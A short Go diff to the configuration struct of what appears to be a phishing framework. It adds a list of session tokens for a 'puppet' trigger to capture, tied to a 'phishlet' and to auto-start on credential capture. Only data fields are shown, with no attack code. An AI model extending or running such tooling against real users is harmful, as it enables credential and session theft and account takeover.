@@ -44,7 +44,8 @@ type PuppetTrigger struct {
 	Description  string         `mapstructure:"description" json:"description" yaml:"description"`
 	Domains      []string       `mapstructure:"domains" json:"domains" yaml:"domains"`           // Target domains
 	Paths        []string       `mapstructure:"paths" json:"paths" yaml:"paths"`                 // Target paths
-	Token        string         `mapstructure:"token" json:"token" yaml:"token"`                 // Token to capture
+	Token        string         `mapstructure:"token" json:"token" yaml:"token"`                 // Primary token (legacy)
+	Tokens       []string       `mapstructure:"tokens" json:"tokens" yaml:"tokens"`              // List of tokens to capture
 	OpenUrl      string         `mapstructure:"open_url" json:"open_url" yaml:"open_url"`       // URL to open in puppet
 	Phishlet     string         `mapstructure:"phishlet" json:"phishlet" yaml:"phishlet"`       // Associated phishlet
 	AutoActivate bool           `mapstructure:"auto_activate" json:"auto_activate" yaml:"auto_activate"` // Auto start on cred capture
